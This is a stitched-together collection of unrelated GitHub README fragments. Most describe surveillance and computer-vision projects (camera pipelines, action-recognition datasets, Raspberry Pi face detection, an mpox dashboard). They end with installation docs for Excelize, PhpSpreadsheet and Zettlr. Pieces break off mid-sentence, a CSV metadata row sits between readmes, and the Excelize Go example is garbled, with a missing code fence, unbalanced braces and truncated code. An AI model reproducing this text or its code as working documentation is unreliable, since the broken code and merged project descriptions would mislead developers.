    ```shell script
    sudo add-apt-repository ppa:deadsnakes/ppa
    sudo apt-get install python3.6
    virtualenv --python=/usr/bin/python3.6 ./
   source ./bin/activate
    ```
2. Install dependencies `pip install -r requirements_linux.txt`
3. Get models using these instruction https://github.com/norkator/open-intelligence/wiki/Models
4. Download PostgreSQL server ( https://www.postgresql.org/ ) I am using version <b>11.6</b> but its also tested with
   version 12. (if you didn't install at upper api section)
5. Separate camera and folder names with comma just like at base config template
6. Run wanted python apps, see `Python Apps` section.



Multi node support
============
Multi node support requires little more work to configure, but it's doable. Follow instructions below.

1. Each node needs to have access to source files hosted by one main node via network share.
2. Create configuration file `config_slave.ini` from template `config_slave.ini.tpl`
3. Fill in postgres connection details having server running postgres as target location.
4. Fill [camera] section folders, these should be behind same mount letter+path on each node.
5. Point your command prompt into network share folder containing `App.py` and other files.
6. On each slave node run `App.py` via giving argument: `\.App.py --bool_slave_node True`

Cuda GPU Support
============
Cuda only works with some processes like super resolution and insightface. Requirements are:

1. NVIDIA only; GPU hardware compute capability: The minimum required Cuda capability is 3.5 so old GPU's won't work.
2. CUDA toolkit version. Windows link for right 10.0
   is https://developer.nvidia.com/cuda-10.0-download-archive?target_os=Windows&target_arch=x86_64
3. Download cuDNN ""Download cuDNN v7.6.3 (August 23, 2019), for CUDA
   10.0"" https://developer.nvidia.com/rdp/cudnn-archive
4. Place cuDNN files inside proper Cuda toolkit installation folders. cuDNN archive has folder structure.

-------------------------------------------------------------

Postgresql notes
============
All datetime fields are inserted without timezone so that:

```
File     : 2020-01-03 08:51:43
Database : 2020-01-03 06:51:43.000000
```

Database timestamps are shifted on use based on local time offset.


Openalpr notes
============
These notes are for Windows. Current Docker way makes this installation automatic.

Got it running with following works. Downloaded `2.3.0` release from here https://github.com/openalpr/openalpr/releases

1. Unzipped `openalpr-2.3.0-win-64bit.zip` to `/libraries` folder
2. Downloaded and unzipped `Source code(zip)`
3. Navigated to `src/bindings/python`
4. Run `python setup.py install`
5. From appeared `build/lib` moved contents to project `libraries/openalpr_64/openalpr` folder.
6. At license plate detection file imported contents with `from libraries.openalpr_64.openalpr import Alpr`

Now works without any python site-package installation.


Front end development
============
There is a separate readme file for this side so see more at `./front-end/README.md`

# **SPHAR**: **S**urveillance **P**erspective **H**uman **A**ction **R**ecognition Dataset


**SPHAR** is a video dataset for **human action recognition**. Its main purpose is to support research in the application area of analyzing activities on public places.

In this domain, most cameras will share a similar mounting angle and perspective, which we will call the **surveillance perspective** from now on. In **SPHAR**, all videos are shot from this or a similar perspective.

The videos have been aggregated from multiple sources, converted to a consistent file type (`H265 HEVC .mp4`), cutted and cropped (spatio-temporally) to contain only one action at a time and last but not least sorted into 14 action classes.

This Repository contains all videos of the SPHAR dataset as well as the [scripts](scripts) needed to create the dataset.

## Known Caveats
Due to different and missing annotations in the original datasets, not all videos could be automatically cropped to the relevant area containing the action.

- The videos of the UCF-ARG and CASIA datasets are only cutted temporally. 
- The videos of the UCF-Crime, CAVIAR and Live Videos datasets are neither cropped nor cutted and might contain camera changes or watermarks. 
- Videos extracted from the MEVA, Okutama, Bit-Interaction, UCF-Aerial, VIRAT Ground and UT-Interaction datasets are both cropped and cutted to relevant actions, but the quality of the cut heavily depends on the quality of the original annotations and therefore varies by each dataset.

You can delete the videos you don't need using a simple filename search, as the video names contain abbreviations for each dataset.

## Download
The easiest way to just get the dataset videos is by downloading one of our [releases](https://github.com/AlexanderMelde/SPHAR-Dataset/releases):

- [**SPHAR-Dataset-1.0.zip**](https://github.com/AlexanderMelde/SPHAR-Dataset/archive/1.0.zip)

If you want to modify the dataset and use the conversion and cutting scripts, clone or fork this repository using:

```
git clone git@github.com:AlexanderMelde/SPHAR-Dataset.git
```

## License
Using the datasets for researching purposes is possible for all of the videos, but licensing is difficult when aggregating data from multiple sources and licenses.

All videos of this dataset contain a reference to the original dataset source in their filename. You must refer to the original licensing conditions for each video / dataset and filter out (remove) any videos you are not licensed to use (see table above).

The work of the **SPHAR Dataset** (aggregation, converting and cropping scripts) - but not the videos itself - are released under the **GNU GPL v3** license (contact me for further licensing options).

See the [LICENSE](LICENSE) file for more details.

## Citation
Please note that none of the supplied videos have been recorded by myself.

The increase of vehicles in urban environments has raised the importance of decreasing car accidents, managing traffic congestion and building automated transportation systems. In this repository, an automatic traffic surveillance system is proposed that uses traffic camera videos of different resolutions. The objective is implemented in three core steps, the first step is the object detection on the scene, the second objective is multiple object tracking and thirdly is the depth estimation which translates coordinates on the image to coordinates on the road plane. The automatic traffic surveillance system provides, obtained trajectories of vehicles and pedestrians, estimated instantaneous and average speeds and translation of tracked trajectories to OpenScenario format.

## Getting Started

Repository to hold code for the [cap-bot](https://github.com/aryankargwal/cap-bot) varient that is being presented at the SIIC Defence Hackathon 2021.
<br>

## Problem Inspiration<br>
<img src=""assets/cctv_system.jpg"" width = ""500px""><br>
A plethora of surveillance devices are being used by the Defense Services for supervision and monitoring. However, most of them are manually operated at the cost of enormous amounts of time and manual labour.<br>
### Check out the [video proposal](https://www.youtube.com/watch?v=nBATYSIb7fs) for the Problem Statement.
<br>

## Problem Description<br>
Present state-of-the-art Surveillance Devices require both consistent manual assistance and time for their successful operation. This results in a considerable loss of manual and technical resources.
<br>

## Proposed Solution<br>
We propose a Deep Learning Application that will be able to solve the above mentioned problems. 
- Our application named ‘Cap-Bot’ is capable of running Image Captioning on multiple CCTV footages and storing the captions along with the camera number and the time of capture in a convenient log.<Br>
<img src = ""assets/cameraui.jpg"" width = ""500px""><br>
- The file of saved captions can then be used to look up for incidents from any instant of time just by entering a few keywords.  The returned camera number and time slot can then be used to obtain the required CCTV footage.<br>
<img src = ""assets/search_tab.png"" width = ""500px""><br>
  
### Check out the [Project Proposal](https://www.youtube.com/watch?v=Sr8dNQMBRZI) for our product.

## Advantages and Features
- Interface to map CCTV Location in a defined area and eventually help single out points of interest.<br>
<img src = ""assets/locations.png"" width = ""500px""><br>
- Since our model relies on Deep Learning, the time can be reduced considerably as we are resorting to an automatic searching operation.<br>
<img src = ""assets/dl.png"" width = ""500px""><br>
- Since the information is purely textual, the encryption of information is way easier than pictorial.<br>
<img src = ""assets/encrypt.png"" width = ""500px""><br>
  
## Steps of Deployment
- [x] Training the Model
- [x] Write the Search Module
- [x] Captioning UI
- [x] Search UI
- [x] Perfecting Search feature 
- [x] Resolving Backend
- [x] Encryption of Generation Captions<br>
<i>Extra Feature</i>
- [ ] CCTV Localization with results

# suppress-for-release

Demonstrates the methods of suppressing small counts in a provincial surveillance system in preparation of data for public release.
![animation](./libs/images/suppress-for-release-animation.gif)
# Background

When a surveillance agency intends to release incidence counts of some health conditions (like in [BC Chronic Disease Dashboard][dashboard]), one must take precaution NOT to disclose values considered ""too small"", which may present a privacy/re-identification risk. Howeever, redacted values sometimes can be re-calculated from the context, so an analyst must detect these patterns and redact more values in order to remove the possiblity of re-calculation. To avoid manual redaction, which is prone to human error and lacks transparency, [BC Observatory][observatory] has developed a suite of R functions to arrive at recommendation for redaction automatically, based on logical tests developed for standard data forms.

For detailed background of the problem this project addresses, please view the slides from the Community of Practice [presentation][cop-presentation] at BCCDC on 2018-03-07 by Brent and Andriy. For the update on the suppression logic (vesion 2) please see [slides][logic-update] by Anthony Leamon. 

# Workflow

The following scripts comprise the workflow of the mechanized redaction of small cells:

- [`./manipulation/0-greeter.R`][greeter] - imports data, establishes decison frame
- [`./manipulation/1-tuner.R`][tuner] - cleans and transformes data
- [`./manipulation/2-tester.R`][tester] - applies logical tests to each frame
- [`./manipulation/3-grapher.R`][grapher] - redacts and plots decisions

vahidzee,pi-surveillance,,https://github.com/vahidzee/pi-surveillance,https://api.github.com/repos/pi-surveillance/vahidzee,Raspberry PI face-detection IOT cluster and central management system,"# Raspberry PI Smart Face-detector Surveillance System


This repository is a complete implementation for a Raspberry Pi-based cluster of surveillance cameras capable of performing on-device face detection and syncing with a customizable central management system. This project was proposed and presented as a part of my Spring 2021's Hardware Laboratory Course at Sharif University of Technology.

The central system is also able to process and distinguish faces in logged images from the pi nodes. It automatically creates a database of known face representations for each user and tracks their temporal and spatial activities. The whole data processing pipeline is designed to minimize the on-edge computations and resource requirements. Therefore the pi nodes only maintain a sporadically updated list of known face representations and communicate identification logs in a secured channel with the central management system to minimize communication and storage requirements.

![Scheme of Rapberry Pi Nodes configuration](files/scheme.jpeg)
**Requirements**: The central system consists of a management server and an administration portal. Both are implemented in a single fully documented Django3 application (available in the `server` directory), ready to be deployed along with the desired SQL database on a primary Ubuntu machine (with at least two processing cores and 2GBs of RAM). PI units are expected to have a working [Camera module](https://projects.raspberrypi.org/en/projects/getting-started-with-picamera) and two [PIR motion sensors](https://medium.com/geekculture/detecting-motions-using-pir-motion-sensor-with-raspberry-pi-98f88f9d5ffe) to detect entrance or exit events and optionally an [16x2 LCD display module](https://tutorials-raspberrypi.com/raspberry-pi-lcd-display-16x2-characters-display-hd44780/) to show greetings and news as mounted on top of a desired property's gateway to surveil. PI's logic is also fully documented and available inside the `pi` directory.

**Workflow**: The whole working mechanism of this system is a simple async IOT cluster implementation. When a person walks by each PI unit, it detects movement and looks for a familiar face representation inside of its copy of the known faces database to acquire its respective FaceID (or uploads the image and asks the central system for one). With a valid FaceID at hand, an appropriate enter or exit event is logged back to the main system. To ensure proper security and simulate an off-the-shelf products' functionality, Communications are initiated using a custom hand-shake method, and the ownership of PI units is registered using unique device IDs upon first device setup.

![Administration Page](files/main.png)
**Administration and Notification System**: The central system separates devices of different users and lets them add or remove known faces and track their activities logged by each of their surveillance IOT sensors. It also sends emails whenever a new event has occurred, making it a simple implementation for a PI-based home security system.

In this tutorial, we will build the home surveillance with OpenCV, Twilio anc Dropbox. 

## 1. Feature of Our Home Surveillance

The feature of our home surveillance are :
- Ability to detect and capture face of a person (using caffe model) then send the detection result to certain user using Twilio. This can be considered as __Notification__. Most of the home surveillance camera doesn't have ability to recognize the face of intruder.
- Detection result image can be kept for long time in __free cloud storage__. In this tutorial, we use __Dropbox__. The other cloud storage are : Google Drive, AWS S3, etc.
- Ability to real time streaming over different network using VNC. With this feature from our home surveillance system, we can see the real time condition of our home although we are far away from our home. 

## 2. Scheme

![Fig1](https://github.com/fidelisgalla/Home-Surveillance/blob/master/Scheme.jpg?raw=true)

## 3. Prerequisite
To begin building our home surveillnace system, we need :

- Twilio API (install using `pip install twilio`)
- Dropbox API (install using `pip install dropbox`)
- OpenCV
- Numpy

## 📜 Description:
Developed an Intrusion Detection System which can detect Intruders. It also makes an Alarm sound when detected to sound or warn the authorities or nearby individuals. Ideal to be used along with CCTVs for wide area Surveillance purposes.

## 🌳 Social-Welfare Usecase:
The Social-Welface usecase of this intrusion detection system (IDS) is that it monitors a network for malicious activity or policy violations. Any malicious activity or violation is typically reported or collected centrally using a security information and event management system. An IDS can be used to help analyze the quantity and types of attacks, and organizations can use this information to change their security systems or implement more effective controls.

# **S-SPHAR**: **S**ynthetic **S**urveillance **P**erspective **H**uman **A**ction **R**ecognition **D**ataset


**S-SPHAR** is a synthetically generated video dataset for human action recognition. Its main purpose is to support research in the application area of analyzing activities on public places.

In this domain, most cameras will share a similar mounting angle and perspective, which we will call the **surveillance perspective** from now on. In **S-SPHAR**, all videos are shot from this or a similar perspective.

The videos have been generated using a self-made simulation built using the Unity game engine and characters and animations from Mixamo.

This Repository contains all videos of the **S-SPHAR** dataset.

## Original Videos
Due to their size, the original videos were not uploaded to GitHub. Instead, they can be found at YouTube under the following links. Read their descriptions for more information:

- [S-SPHAR-3](https://youtu.be/ybFYFRJoQho)
- [S-SPHAR-2](https://youtu.be/3x8ga83Cm1k)
- [S-SPHAR-1](https://youtu.be/64NR86A3tGU)

[![preview image of S-SPHAR videos](https://img.youtube.com/vi/ybFYFRJoQho/mqdefault.jpg)](https://youtu.be/ybFYFRJoQho)

Those Videos are combinations of the following video views:
- Original camera image
- Segmentation masks for labeled action classes
- Overlay of segmentation masks over original camera image
- Bounding boxes around action instance tubes

The videos are all 4K resolution, so you can split it back into four FHD videos using simple tools like OpenCV or other video editors.

I used a simple video for tracking (partial implementation) but if you use a **complex video (When CCTV is closer and there is so much occlusion throughout the video)**, customized

Respicere *(latin: to look back)* is a self hosted surveillance system that uses a webcam attached to the computer as Camera.

Currently it only takes photos but it will support video recording soon.
To run it, grab the zip file from the Releases page and run it, then open the ip and port shown in the console.

### Why?
I didn't find something that worked like i wanted it. And in fact most of the systems i found wouldn't even start.
### How?
Respicere is based on FlashCap for recording, ImageSharp for Transcoding and Blazor as a frontend.

## TODO
**Very near future:** add GitHub actions and Docker support  
**Near Future:** add video recording  
**Later:** add authetication  
**Maybe sometimes:** Add person recognition, create dektop and/or mobile apps, full blown account system

#### Computer Vision projects using Python and OpenCV.

The first project is based on manipulating images, introducing concepts such as filters, object detection,
data manipulation, to count how many coins, and what their values are in a horizontal plane at a predetermined distance from the ground.

The second project is based on an algorithm capable of being integrated into an 
autonomous video surveillance system. The algorithm is able to identify the movement of 
objects (active regions) of interest, such as people or cars, and classify these objects 
into one of 3 possible classes (Person, car, other).

It is a low-cost remote surveillance system built using the Raspberry Pi platform. Please, read the documentation for details.","# Smart-Surveillance-System

## BASIC SETUP
![IMG_20190207_155957_HDR](https://user-images.githubusercontent.com/42694653/88503096-5268fe00-cfee-11ea-9f62-8036d6820fd5.jpg)


The goal of the project is to develop a low-cost remote surveillance system using Raspberry Pi platform that provides the user with a much better way for monitoring. As the user should not be bothered by a constant alert in case of any motion detected, it additionally performs an image processing on the images in the cloud and then sends an alert using a text message to the user.

In this prototype, the detection of the motion and capturing of the image is done on the Raspberry Pi and the image processing is done on the PC which acts as a local server. The basic working of the complete prototype can be described in the following steps:

## The Raspberry Pi’s functioning:
1. Sense motion using PIR sensor.
2. If motion is detected:
I. Capture images using the camera module.
II. Zip the folder that contain the images.
III. Send the zipped file to cloud (in this case Dropbox)
3. If motion not detected, repeat Step 1 after some interval of time.

The next time it detects motion, the previously captured images and zipped file are deleted, thus clearing up the space on Raspberry Pi.

## The program running on the server:

1. Check if new file has arrived in the Dropbox.

2. If new file is detected:

    I. Download the file.
  
    II. Unzip the file.
  
    III. Apply image processing on all the images.
  
    IV. Check if human detected.
  
      i. If yes, send a notification to the user.
    
      ii. Save a copy of the image.
    
    V. Delete the file from the Dropbox.
  
3. If new file is not detected, check the Dropbox again after some interval of time.

DQ4781,Monkeypox-Dashboard,,https://github.com/DQ4781/Monkeypox-Dashboard,https://api.github.com/repos/Monkeypox-Dashboard/DQ4781,"A Real-Time, Data-Driven Infectious Disease Dashboard and Surveillance Application to Monitor the 2022-2023 Global Mpox Outbreak","<H2 align=""center""> 2022-2023 Mpox Dashboard</H2>

This project offers a *mobile-friendly*, *open-source*, *web-based* dashboard surveillance system that visualizes and identifies epidemiological patterns for any infectious disease in real-time. This dashboard is currently tracking the most recent monkeypox outbreak in the United States and can **identify the relationship between public health interventions and the fall of cases** in the US. Developed by Daniel Quezada for [CSUF's CEDDI Lab](https://www.sampsonakwafuo.com/ceddi-lab).

![Alt Text](imgs/homepage-web.png)

## Overview 📖

### Current State of Epidemiological Data Streams
- Modern telecommunications allow for public health organizations to disseminate epidemiological data
- Lower-to-middle income countries (LMICs) begin to adopt disease surveillance systems similar to high-income countries (HICs)
- Data streams have low enough latency that institutions can **publish epidemiological data in near real-time**

### Digital Syndromic Dashboards as Surveillance Tools
- Dashboard Surveillance Systems **proved to be an effective tool** to develop intervention strategies against prevalence of SARS-CoV-2
- Surveillance Systems in LMICs are typically outdated and *still rely on data from paper-based records*
- Without proper surveillance, outbreaks are more likely to spread to neighboring communities, provinces, or nations

### Human mpox
- Human monkeypox (mpox) is a zoonotic viral infetion that is extremely transmissible upon close contact, especially through sexual contact
- Most recent outbreak of 2022 represents **first time in almost twenty years that mpox has had an outbreak outside of Africa**
- Currently there are no FDA approved therapeutics or vaccines for mpox specifically


## How & What Does this Dashboard Track? 🔍

It tracks relevant epidemiological data such as:
- Total Number of Confirmed Cases
- Total Number of Vaccines Administered
- Gender Distributions of Confirmed Cases

Visualizations were created with **Plotly** & may come in the form of:
- Choropleth maps
- Bar charts 
- Line charts

Guardgram to control Embedded low-cost surveillance system  via Telegram bot

### Revision history

* Guardgram Firmware Source for ESP32-CAM v0.0.1-07042021 
  - Support take photos and send it via telegram bot
  - Support change lamp status via telegram bot
  - Config Guardgram manually only (WiFi Credentials, Telegram Bot Token, and Telegram user ID)
  - Developed based Arduino framework (Using Arduino, ArduinoJson, and Universal-Arduino-Telegram-Bot )

### How to get Telegram Bot Token
To take you one Telegram Bot Token you need to create a Telegram Bot. Open Telegram App, then Search for @botfather, or open t.me/botfather.
When botfather opened, click start button,  then write or choose /newbot and follow the instructions to create your bot, you will give it a name and username. If your bot is successfully created, you’ll receive a message with a link to access the bot and the bot token, like this:

```
Done! Congratulations on your new bot. You will find it at t.me/xxxxxxxx. You can now add a description, about section and profile picture for your bot, see /help for a list of commands. By the way, when you've finished creating your cool bot, ping our Bot Support if you want a better username for it. Just make sure the bot is fully operational before you do this.

Use this token to access the HTTP API:
XXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Keep your token secure and store it safely, it can be used by anyone to control your bot.

For a description of the Bot API, see this page: https://core.telegram.org/bots/api
```
Your bot token is: XXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

### How to get User ID
Anyone has your bot username can control your Guardgram, to make sure that your Guardgram authorized you only to control it, you need to put your Telegram User ID to Guardgram configuration.
To get it, open Telegram app, search for @IDBot or open this link t.me/myidbot. type /getid. You will get a reply back with your user ID. 

### Guardgram configuration 
* In v0.0.1-07042021, you need to put manually: Telegram bot token and Telegram User ID in guardgram_telegrambot.h , and WiFi Credentials in guardgram_wifi.h

# Excelize

## Introduction

Excelize is a library written in pure Go providing a set of functions that allow you to write to and read from XLAM / XLSM / XLSX / XLTM / XLTX files. Supports reading and writing spreadsheet documents generated by Microsoft Excel&trade; 2007 and later. Supports complex components by high compatibility, and provided streaming API for generating or reading data from a worksheet with huge amounts of data. This library needs Go version 1.16 or later. There are some [incompatible changes](https://github.com/golang/go/issues/61881) in the Go 1.21.0, the Excelize library can not working with that version normally, if you are using the Go 1.21.x, please upgrade to the Go 1.21.1 and later version. The full docs can be seen using go's built-in documentation tool, or online at [go.dev](https://pkg.go.dev/github.com/xuri/excelize/v2) and [docs reference](https://xuri.me/excelize/).

## Basic Usage

### Installation

```bash
go get github.com/xuri/excelize
```

- If your packages are managed using [Go Modules](https://go.dev/blog/using-go-modules), please install with following command.

```bash
go get github.com/xuri/excelize/v2
```

### Create spreadsheet

import (
    ""fmt""

    ""github.com/xuri/excelize/v2""
)

func main() {
    f := excelize.NewFile()
    defer func() {
        if err := f.Close(); err != nil {
            fmt.Println(err)
        }
    }()
    // Create a new sheet.
    index, err := f.NewSheet(""Sheet2"")
    if err != nil {
        fmt.Println(err)
        return
    }
    // Set value of a cell.
    f.SetCellValue(""Sheet2"", ""A2"", ""Hello world."")
    f.SetCellValue(""Sheet1"", ""B2"", 100)
    // Set active sheet of the workbook.
    f.SetActiveSheet(index)
    // Save spreadsheet by the given path.
    if err := f.SaveAs(""Book1.xlsx""); err != nil {
        fmt.Println(err)
    }
}
```

### Add chart to spreadsheet file

With Excelize chart generation and management is as easy as a few lines of code. You can build charts based on data in your worksheet or generate charts without any data in your worksheet at all.

<p align=""center""><img width=""650"" src=""./test/images/chart.png"" alt=""Excelize""></p>

```go
package main

import (
    ""fmt""

    ""github.com/xuri/excelize/v2""
)

func main() {
    f := excelize.NewFile()
    defer func() {
        if err := f.Close(); err != nil {
            fmt.Println(err)
        }
    }()
    for idx, row := range [][]interface{}{
        {nil, ""Apple"", ""Orange"", ""Pear""}, {""Small"", 2, 3, 3},
        {""Normal"", 5, 2, 4}, {""Large"", 6, 7, 8},
    } {
        cell, err := excelize.CoordinatesToCellName(1, idx+1)
        if err != nil {
            fmt.Println(err)
            return
        }
        f.SetSheetRow(""Sheet1"", cell, &row)
    }
    if err := f.AddChart(""Sheet1"", ""E1"", &excelize.Chart{
        Type: excelize.Col3DClustered,
        Series: []excelize.ChartSeries{
            {
                Name:       ""Sheet1!$A$2"",

                Values:     ""Sheet1!$B$2:$D$2"",
            },
            {
                Name:       ""Sheet1!$A$3"",

                Text: ""Fruit 3D Clustered Column Chart"",
            },
        },
    }); err != nil {

    if err := f.AddPicture(""Sheet1"", ""D2"", ""image.jpg"",
        &excelize.GraphicOptions{ScaleX: 0.5, ScaleY: 0.5}); err != nil {
        fmt.Println(err)
    }
    // Insert a picture offset in the cell with printing support.
    enable, disable := true, false

PhpSpreadsheet is a library written in pure PHP and offers a set of classes that
allow you to read and write various spreadsheet file formats such as Excel and LibreOffice Calc.

## PHP Version Support

LTS: Support for PHP versions will only be maintained for a period of six months beyond the
[end of life](https://www.php.net/supported-versions) of that PHP version.

Currently the required PHP minimum version is PHP __8.0__, and we [will support that version](https://www.php.net/eol.php) until May 2024.

See the `composer.json` for other requirements.

## Installation

Use [composer](https://getcomposer.org) to install PhpSpreadsheet into your project:

```sh
composer require phpoffice/phpspreadsheet
```

If you are building your installation on a development machine that is on a different PHP version to the server where it will be deployed, or if your PHP CLI version is not the same as your run-time such as `php-fpm` or Apache's `mod_php`, then you might want to add the following to your `composer.json` before installing:
```json
{
    ""require"": {
        ""phpoffice/phpspreadsheet"": ""^1.28""
    },
    ""config"": {
        ""platform"": {
            ""php"": ""8.0""
        }
    }
}
```
and then run
```sh
composer install
```
to ensure that the correct dependencies are retrieved to match your deployment environment.

See [CLI vs Application run-time](https://php.watch/articles/composer-platform-check) for more details.

### Additional Installation Options

If you want to write to PDF, or to include Charts when you write to HTML or PDF, then you will need to install additional libraries:

#### PDF

For PDF Generation, you can install any of the following, and then configure PhpSpreadsheet to indicate which library you are going to use:
 - mpdf/mpdf
 - dompdf/dompdf
 - tecnickcom/tcpdf

and configure PhpSpreadsheet using:

```php
// Dompdf, Mpdf or Tcpdf (as appropriate)
$className = \PhpOffice\PhpSpreadsheet\Writer\Pdf\Dompdf::class;
IOFactory::registerWriter('Pdf', $className);
```
or the appropriate PDF Writer wrapper for the library that you have chosen to install.

#### Chart Export

For Chart export, we support following packages, which you will also need to install yourself using `composer require`
 - [jpgraph/jpgraph](https://packagist.org/packages/jpgraph/jpgraph) (this package was abandoned at version 4.0. 
   You can manually download the latest version that supports PHP 8 and above from [jpgraph.net](https://jpgraph.net/))
 - [mitoteam/jpgraph](https://packagist.org/packages/mitoteam/jpgraph) - up to date fork with modern PHP versions support and some bugs fixed.

and then configure PhpSpreadsheet using:
```php
// to use jpgraph/jpgraph
Settings::setChartRenderer(\PhpOffice\PhpSpreadsheet\Chart\Renderer\JpGraph::class);
//or
// to use mitoteam/jpgraph
Settings::setChartRenderer(\PhpOffice\PhpSpreadsheet\Chart\Renderer\MtJpGraphRenderer::class);
```

One or the other of these libraries is necessary if you want to generate HTML or PDF files that include charts; or to render a Chart to an Image format from within your code.
They are not necessary to define charts for writing to `Xlsx` files.
Other file formats don't support writing Charts.

Please ask your support questions on [StackOverflow](https://stackoverflow.com/questions/tagged/phpspreadsheet), or have a quick chat on [Gitter](https://gitter.im/PHPOffice/PhpSpreadsheet).

## Patreon

I am now running a [Patreon](https://www.patreon.com/MarkBaker) to support the work that I do on PhpSpreadsheet.

Supporters will receive access to articles about working with PhpSpreadsheet, and how to use some of its more advanced features.

Posts already available to Patreon supporters:
 - The Dating Game
   - A  look at how MS Excel (and PhpSpreadsheet) handle date and time values.
- Looping the Loop
    - Advice on Iterating through the rows and cells in a worksheet.

And for Patrons at levels actively using PhpSpreadsheet:
 - Behind the Mask
   - A look at Number Format Masks.

The Next Article (currently Work in Progress):
 - Formula for Success
   - How to debug formulae that don't produce the expected result.


My aim is to post at least one article each month, taking a detailed look at some feature of MS Excel and how to use that feature in PhpSpreadsheet, or on how to perform different activities in PhpSpreadsheet.

Planned posts for the future include topics like:
 - Tables
 - Structured References
 - AutoFiltering
 - Array Formulae
 - Conditional Formatting
 - Data Validation
 - Value Binders
 - Images
 - Charts

After a period of six months exclusive to Patreon supporters, articles will be incorporated into the public documentation for the library.

## PHPExcel vs PhpSpreadsheet ?

PhpSpreadsheet is the next version of PHPExcel. It breaks compatibility to dramatically improve the code base quality (namespaces, PSR compliance, use of latest PHP language features, etc.).

Because all efforts have shifted to PhpSpreadsheet, PHPExcel will no longer be maintained. All contributions for PHPExcel, patches and new features, should target PhpSpreadsheet `master` branch.

Do you need to migrate? There is [an automated tool](/docs/topics/migration-from-PHPExcel.md) for that.

To install Zettlr, just [download the latest release](https://www.zettlr.com/download/) for your operating system. Currently supported are macOS, Windows, and most Linux distributions (via Debian- and Fedora-packages as well as AppImages).

On our website and here on GitHub, we provide a set of installers for the most common use-cases. We provide both 64-bit installers as well as installers for ARM systems (called ""Apple Silicon"" in the macOS ecosystem). 32-bit is not supported. We offer the following binaries directly:

* Windows (x64)
* macOS (Intel and Apple Silicon)
* Debian and Fedora (x64 and ARM)
* AppImage (x64 and ARM)

Thanks to our community, we can also offer you a variety of other installation opportunities:

* [Chocolatey (Windows)](https://community.chocolatey.org/packages/zettlr/)
* [Homebrew (macOS)](https://formulae.brew.sh/cask/zettlr)
* [Arch Linux](https://wiki.archlinux.org/title/Zettlr)
* [FlatPack (Linux)](https://flathub.org/apps/details/com.zettlr.Zettlr)

All other [platforms that Electron supports](https://www.electronjs.org/docs/latest/development/build-instructions-gn#platform-prerequisites) are supported as well, but you will need to build the app yourself for this to work.

**Please also consider [becoming a patron](https://www.patreon.com/zettlr) or making a [one-time donation](https://paypal.me/hendrikerz)!**

## Getting Started

After you have installed Zettlr, [head over to our documentation](https://docs.zettlr.com/) to get to know Zettlr. Refer to the [Quick Start Guide](https://docs.zettlr.com/en/5-minutes/), if you prefer to use software heads-on.

## Contributing

As an Open Source application, Zettlr always welcomes contributions from the community. **You do not need to know how to write code to help!** A full overview over all the areas where you can help can be found in our [contributing guide](./CONTRIBUTING.md). Here, we introduce you to the two biggest areas where we welcome help: translations and contributing code.

### Translating

The development team maintains the English and German translations, but lacks adequate knowledge of other languages. All the other available translations have been created by our community.

Zettlr's translations utilize the [gettext system](https://www.gnu.org/software/gettext/). This means that the translations are kept in PO-files within the [`static/lang` directory](./static/lang).

To update a translation, simply download the corresponding language file and edit it. You can edit PO-files with a simple text editor, but if you prefer a more comfortable graphical editor, there are many out there. One good option is the Open Source editor [POedit](https://poedit.net/).

As soon as you are happy with your changes, open a Pull Request here that updates the corresponding file. GitHub has created a great [guide on how to open Pull Requests](https://docs.github.com/en/repositories/working-with-files/managing-files/editing-files#editing-files-in-another-users-repository).

### Contributing Code

Zettlr is an [Electron](https://www.electronjs.org/)-based app, so to start developing, you'll need to have the following installed on your computer:

1. [NodeJS](https://nodejs.org/). Make sure it's at least Node 18 (`lts/hydrogen`). To test what version you have, run `node -v`.
2. [Yarn](https://yarnpkg.com/en/). This is the package manager for the project, as we do not commit `package-lock.json`-files and many commands require yarn. You can install this globally using `npm install -g yarn` or Homebrew, if you are on macOS.
3. On Windows, we recommend to [install the Windows Subsystem for Linux (WSL)](https://learn.microsoft.com/en-us/windows/wsl/install), which will make many of the next steps easier.
4. A few command-line utilities that various scripts require for running the development builds:
    * [`cURL`](https://curl.se/download.html) (required by the Pandoc download script)
    * `unzip` (required by the Pandoc download script)
    * [`jq`](https://jqlang.github.io/jq/) (required by the i18n script)
5. An appropriate build toolchain for your operating system, since Zettlr requires a few native C++-modules that must be compiled before running the app:
    * **macOS**: On macOS, installing the XCode command-line tools via `xcode-select --install` suffices
    * **Windows**: On Windows, you'll need the [free Visual Studio development tools](https://visualstudio.microsoft.com/free-developer-offers/) that include the required tools
    * **Linux**: On Linux, there are a variety of compatible toolchains available, sometimes they are already preinstalled. Refer to your distribution's manual for more information.

Then, simply clone the repository and install the dependencies on your local computer:

```bash
$ git clone https://github.com/Zettlr/Zettlr.git
$ cd Zettlr
$ yarn install --immutable
```

The `--immutable` flag ensures that yarn will stick to the versions as listed in the `yarn.lock` and not attempt to update them.

During development, hot module reloading (HMR) is active so that you can edit the renderer's code easily and hit `F5` after the changes have been compiled by `electron-forge`. You can keep the developer tools open to see when HMR has finished loading your changes.

### What Should I Know To Contribute Code?

In order to provide code, you should have basic familiarity with the following topics and/or manuals (ordered by descending importance):

* [JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript) (especially asynchronous code) and [TypeScript](https://www.typescriptlang.org/docs/)
* [Node.js](https://nodejs.org/api/)
* [Electron](https://www.electronjs.org/docs)
* [Vue.js 3.x](https://vuejs.org/guide/introduction.html) and [Vuex](https://vuex.vuejs.org/)
* [CodeMirror 6.x](https://codemirror.net/docs/)
* [ESLint](https://eslint.org/)
* [LESS](https://lesscss.org/#)
* [Webpack 5.x](https://webpack.js.org/concepts/)
* [Electron forge](https://www.electronforge.io/)
* [Electron builder](https://www.electron.build/)

> Note: See the ""Directory Structure"" section below to get an idea of how Zettlr specifically works.

### Development Commands

This section lists all available commands that you can use during application development. These are defined within the `package.json` and can be run from the command line by prefixing them with `yarn`. Run them from within the base directory of the repository.

#### `start`

Starts `electron-forge`, which will build the application and launch it in development mode. This will use the normal settings, so if you use Zettlr on the same computer in production, it will use the same configuration files as the regular application. This means: be careful when breaking things. In that case, it's better to use `test-gui`.

#### `package`

Packages the application, but not bundle it into an installer. Without any suffix, this command will package the application for your current platform and architecture. To create specific packages (may require running on the corresponding platform), the following suffixes are available:

- `package:mac-x64` (Intel-based Macs)
- `package:mac-arm` (Apple Silicon-based Macs)
- `package:win-x64` (Intel-based Windows)
- `package:win-arm` (ARM-based Windows)
- `package:linux-x64` (Intel-based Linux)
- `package:linux-arm` (ARM-based Linux)

